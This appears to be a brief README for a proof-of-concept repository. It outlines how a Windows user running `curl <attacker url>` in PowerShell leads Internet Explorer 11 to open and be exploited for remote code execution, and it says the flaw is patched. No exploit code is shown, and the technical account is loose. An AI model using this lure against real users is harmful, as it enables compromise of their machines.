
# Windows IE11 RCE PoC

This repository is only for educational and entertainment purposes.
I am not responsible for any damages caused by the code in this repository.

## Flow

1. Victim runs `curl <attacker url>` in powershell which is an alias to Invoke-WebRequest
2. iwr runs js for some reason and funny call opens internet explorer
3. Internet explorer is so old it has 1000 CVEs its easy to exploit

## Disclaimer

The IE11 rce has been patched so it doesnt actually work,
for a real attack there would be a more sophisticated RCE involving a sandbox escape.
